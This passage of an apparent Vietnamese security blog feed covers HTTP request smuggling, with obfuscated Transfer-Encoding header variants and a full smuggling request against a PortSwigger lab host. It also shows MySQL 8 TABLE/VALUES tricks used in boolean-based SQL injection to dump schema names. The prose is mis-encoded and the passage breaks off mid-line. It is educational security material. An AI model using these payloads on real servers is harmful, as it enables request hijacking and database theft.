xchunked</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Giáº£ sá»­ chÃºng ta cÃ³ má»™t request nhÆ° sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>MÃ¡y chá»§ Proxy nháº­n <code>Transfer-Encoding: chunked\r\n</code>, tháº¥y yÃªu cáº§u há»£p lá»‡ nÃ³ gá»­i Ä‘áº¿n mÃ¡y chá»§ back-end.<br>MÃ¡y chá»§ back-end: LÃºc nÃ y do tá»“n táº¡i hai trÆ°á»ng <code>Transfer-Encoding: chunked\r\n</code> vÃ  <code>Transfer-encoding: cow\r\n</code> nÃªn khiáº¿n mÃ¡y chá»§ bá»‹ rá»‘i, nÃ³ khÃ´ng biáº¿t nháº­n cÃ¡i nÃ o nÃªn cÃ³ thá»ƒ bÃ¢y giá» nÃ³ sáº½ nháº­n <code>Content-length: 4\r\n</code>. <code>5c\r\n = 4bytes</code> nÃªn pháº§n sau Ä‘Æ°á»£c xem nhÆ° lÃ  má»™t yÃªu cáº§u khÃ¡c, vÃ  do mÃ¡y chá»§ tá»“n táº¡i pipelining nÃªn nÃ³ Ä‘Æ°á»£c coi nhÆ° lÃ  má»™t yÃªu cáº§u khÃ¡c biá»‡t. LÃºc nÃ y má»™t lá»—i <code>Unrecognized method aPOST</code> sáº½ Ä‘Æ°á»£c tráº£ vá».</p><h2 id="Web-cache-poisoning-thong-qua-HRS"><a href="#Web-cache-poisoning-thong-qua-HRS" class="headerlink" title="Web cache poisoning thÃ´ng qua HRS:"></a>Web cache poisoning thÃ´ng qua HRS:</h2><p>Tham kháº£o:</p><ul><li><a href="https://brightsec.com/blog/http-request-smuggling-hrs/#how-hrs-works">https://brightsec.com/blog/http-request-smuggling-hrs/#how-hrs-works</a></li><li><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></li><li><a href="https://crashtest-security.com/http-request-smuggling/">https://crashtest-security.com/http-request-smuggling/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</category>
      
      
      <category domain="https://rayinaw.github.io/tags/HRS/">HRS</category>
      
      
      <comments>https://rayinaw.github.io/2022/11/30/http-request-smuggling-HTTP-1.1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TÃ­nh nÄƒng má»›i cá»§a Mysql 8</title>
      <link>https://rayinaw.github.io/2022/11/27/sqli-mysql8/</link>
      <guid>https://rayinaw.github.io/2022/11/27/sqli-mysql8/</guid>
      <pubDate>Sun, 27 Nov 2022 15:13:20 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Tinh-nang-moi-cua-mysql8&quot;&gt;&lt;a href=&quot;#Tinh-nang-moi-cua-mysql8&quot; class=&quot;headerlink&quot; title=&quot;TÃ­nh nÄƒng má»›i cá»§a mysql8&quot;&gt;&lt;/a&gt;TÃ­nh nÄƒng má»›i </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Tinh-nang-moi-cua-mysql8"><a href="#Tinh-nang-moi-cua-mysql8" class="headerlink" title="TÃ­nh nÄƒng má»›i cá»§a mysql8"></a>TÃ­nh nÄƒng má»›i cá»§a mysql8</h1><h2 id="Cau-lenh-TABLE"><a href="#Cau-lenh-TABLE" class="headerlink" title="CÃ¢u lá»‡nh TABLE"></a>CÃ¢u lá»‡nh TABLE</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TABLE</span> table_name [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name] [LIMIT number [<span class="keyword">OFFSET</span> number]]</span><br></pre></td></tr></table></figure><p>Chá»©c nÄƒng: Tráº£ vá» cÃ¡c hÃ ng vÃ  cá»™t cá»§a báº£ng Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> chuly  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> zujchi <span class="operator">|</span> cutee   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> spider <span class="operator">|</span> ugly    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>TrÃ´ng thÃ¬ tÆ°Æ¡ng tá»± nhÆ° cÃ¢u lá»‡nh select. Ká»ƒ cáº£ káº¿t há»£p order.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> chuly  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> zujchi <span class="operator">|</span> cutee   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> spider <span class="operator">|</span> ugly    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>Tuy nhiÃªn Ä‘iá»ƒm khÃ¡c á»Ÿ Ä‘Ã¢y lÃ  cÃ¢u lá»‡nh table sáº½ láº¥y ra toÃ n bá»™ báº£ng, váº­y nÃªn where clause sáº½ khÃ´ng cÃ³ tÃ¡c dá»¥ng, nÃ³ sáº½ Ä‘Æ°a ra lá»—i.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;where id = 2&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="Cau-lenh-VALUES"><a href="#Cau-lenh-VALUES" class="headerlink" title="CÃ¢u lá»‡nh VALUES"></a>CÃ¢u lá»‡nh VALUES</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> row_constructor_list [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_designator] [LIMIT <span class="keyword">BY</span> number]</span><br><span class="line"> </span><br><span class="line">row_constructor_list:</span><br><span class="line">    <span class="type">ROW</span>(value_list)[, <span class="type">ROW</span>(value_list)][, ...]</span><br><span class="line"> </span><br><span class="line">value_list:</span><br><span class="line">    <span class="keyword">value</span>[, <span class="keyword">value</span>][, ...]</span><br><span class="line"> </span><br><span class="line">column_designator: </span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure><p>CÃ¢u lá»‡nh nhÃ¬n khÃ¡ phá»©c táº¡p, Ä‘Æ¡n giáº£n nÃ³ chá»‰ Ä‘Æ°a ra cÃ¡c row mÃ  chÃºng ta Ä‘á»‹nh nghÄ©a. VÃ­ dá»¥ cho dá»… hiá»ƒu:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span>  <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="type">row</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>),<span class="type">row</span>(<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> column_0 <span class="operator">|</span> column_1 <span class="operator">|</span> column_2 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">4</span> <span class="operator">|</span>        <span class="number">5</span> <span class="operator">|</span>        <span class="number">6</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">7</span> <span class="operator">|</span>        <span class="number">8</span> <span class="operator">|</span>        <span class="number">9</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>CÃ¢u lá»‡nh nÃ y cÃ³ thá»ƒ káº¿t há»£p vá»›i union nhÆ° sau:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> chuly <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span> <span class="number">3</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>CÃ³ thá»© hay ho rá»“i Ä‘áº¥y :P</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,database(),<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> mysql <span class="operator">|</span> <span class="number">3</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,(<span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> <span class="number">3</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h2 id="Su-dung-cau-lenh-table-de-dump-database"><a href="#Su-dung-cau-lenh-table-de-dump-database" class="headerlink" title="Sá»­ dá»¥ng cÃ¢u lá»‡nh table Ä‘á»ƒ dump database:"></a>Sá»­ dá»¥ng cÃ¢u lá»‡nh table Ä‘á»ƒ dump database:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.schemata;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span> DEFAULT_ENCRYPTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> mysql              <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> information_schema <span class="operator">|</span> utf8mb3                    <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> performance_schema <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> sys                <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span> DEFAULT_ENCRYPTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> mysql       <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.schemata limit <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span> DEFAULT_ENCRYPTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> performance_schema <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br></pre></td></tr></table></figure><p>Äá»ƒ dump ra tÃªn SCHEMA_NAME báº±ng hÃ m table ta sáº½ sá»­ dá»¥ng Boolean-based SQL Injection. Äá»ƒ dá»… hÃ¬nh dung chÃºng ta cÃ¹ng Ä‘i vÃ o vÃ­ dá»¥:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--MÃ¬nh chá»‰ viáº¿t ra Ä‘áº§y Ä‘á»§ 1 cÃ¢u truy váº¥n náº¿u nhÆ° dÃ­nh sqli sáº½ nhÆ° tháº¿ nÃ o Ä‘á»ƒ cÃ¡c báº¡n dá»… hÃ¬nh dung. MÃ¬nh sáº½ giáº£i thÃ­ch sau ^^</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>LÆ°u Ã½ lÃ  náº¿u chÃºng ta cáº§n tÃ¬m cá»™t sau thÃ¬ pháº£i biáº¿t giÃ¡ trá»‹ cá»™t trÆ°á»›c má»›i so sÃ¡nh Ä‘Æ°á»£c, cÃ¡c cá»™t sau khÃ´ng quan trá»ng. á» Ä‘Ã¢y giÃ¡ trá»‹ cá»§a cá»™t Ä‘áº§u tiÃªn sáº½ lÃ  def, cá»™t thá»© 2 lÃ  tÃªn database, cÃ¡c cá»™t sau lÃ  khÃ´ng quan trá»ng Ä‘á»‘i vá»›i chÃºng ta. ChÃºng ta cÃ¹ng Ä‘i vÃ o pháº§n boolean cá»§a payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span 